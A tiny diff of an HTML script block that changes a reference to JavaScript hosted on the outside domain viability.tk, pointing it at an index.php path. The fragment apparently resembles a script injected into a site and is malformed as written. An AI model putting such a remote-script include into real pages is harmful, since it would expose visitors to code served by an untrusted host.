@@ -1,3 +1,5 @@
 <script>
-src="https://viability.tk/js/"
+  
+src="https://viability.tk/js/index.php"
+
 </script>
